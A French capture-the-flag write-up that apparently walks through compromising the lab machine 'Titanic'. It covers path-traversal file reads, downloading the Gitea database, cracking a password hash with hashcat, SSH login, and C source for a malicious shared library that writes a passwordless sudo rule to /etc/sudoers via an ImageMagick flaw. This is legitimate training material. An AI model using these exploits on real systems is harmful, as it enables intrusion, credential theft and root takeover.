
## Enumération:

- **IP**:
```
10.10.11.55
```

- **OS**: Linux

- **nmap**:

```
nmap -sC -sV -oN titanic.nmap 10.10.11.55
```

![[Pasted image 20250405225500.png]]

On peut voir le **web** du serveur on se connectant avec le port **80**
![[Pasted image 20250405225858.png]]

En remplissant le formulaire suivant, le site te redirige vers un lien qui télécharge un fichier **.json** qui stocke touts ce que tu a entré dans le formulaire.
![[Pasted image 20250405230702.png]]

En remplaçant `/download?ticket=9543a70f-ca16-4d00-8fb7-b486b81338f4.json` par `/download?ticket=../../../../etc/passwd`, il lance un **téléchargement**. Ça veut dire que le serveur est vulnérable à **LFI** ou **Local File Inclusion**

Dans le fichier `/etc/passwd.txt` que nous venons de télécharger, on peut trouver que `developer`  est l'utilisateur principale:

![[Pasted image 20250405233050.png]]

Dans le fichier `etc/hosts` on peut constater qu'il y un autre non de domaine : `dev.titanic.htb`

![[Pasted image 20250405233448.png]]
En tapant `dev.titanic.htb` on tombe sur ce site:

![[Pasted image 20250405233848.png]]
On peut s'inscrire au site et voir dans liste des repository, 2 repository:

![[Pasted image 20250405234526.png]]
dans `developer/docker-config/gitea/docker-compose.yml` on peut constater que les données sont stocké dans **/home/developer/gitea/data**:

![[Pasted image 20250405234901.png]]

En faisant référence à la documentation de Gitea, nous apprenons que toutes les données utilisateur sont stockées dans un fichier `gitea.db` sqlite, et le fichier est à son tour stocké en `/data /gitea` dans l'image docker. Le chemin final est:

```
/home/developer/gitea/data/gitea/gitea.db
```

nous allons télécharger ce fichier avec la commande :

```
curl -s "http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db" -o gitea.db
```

On peut ouvrir le fichier avec la commande `sqlite3`

![[Pasted image 20250406093501.png]]

On va maintenant essayer de retirer un **mdp** des **user**:

```
SELECT lower_name, passwd, salt FROM user;
```

On trouver un mdp **haché** de l'utilisateur **developer**:
```
developer|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cb  
c8efc5dbef30bf1682619263444ea594cfb56|8bf3e3452b78544f8bee9400d6936d34
```

On doit d'abord transformer **hash** en **sha256** avec le script : [gitea2hashcat.py](https://github.com/unix-ninja/hashcat/blob/master/tools/gitea2hashcat.py)
En entrant :

```
e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cb  
c8efc5dbef30bf1682619263444ea594cfb56:8bf3e3452b78544f8bee9400d6936d34
```
comme **entrée** lors de la compilation, on obtient:

```
sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
```

On peut maintenant cracker ce hash avec la commande :

```
hashcat -m 10900 gitea_hash.txt /usr/share/wordlists/rockyou.txt
```

On obtient un mot de passe `25282528`

![[Pasted image 20250406172348.png]]

On peut maintenant se connecter à l'utilisateur **developer** avec **ssh** avec la commande:
`ssh developer@titanic.htb`

![[Pasted image 20250406172558.png]]

---
## Augmentation des privilèges

Dans le répertoire `/opt/scripts` on trouver le fichier `identify_images.sh`. En inspectant le contenu du fichier, on peut déduire qu'Il appelle la commande d'identification d' **ImageMagick** sur les images téléchargées. La version de **ImageMagick** dans le système est le **ImageMagick 7.1.1-35** qui  **est vulnérable à un exploit de code arbitraire connu**.

On va créer un fichier appelé **a.c** dans le répertoire `/opt/app/static/assets/images`, et y mettre le code suivant:

```
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("echo 'developer ALL=(ALL) NOPASSWD:ALL' | sudo tee -a /etc/sudoers");
}
```
```

La commande ci-dessous fait que je peux utiliser la commande `sudo` sans entrer un mdp:
```
gcc -fPIC -shared -o ./libxcb.so.1 a.c -nostartfiles
```

maintenant, op peut taper `sudo cat /root/root.txt` pour avoir le rout flag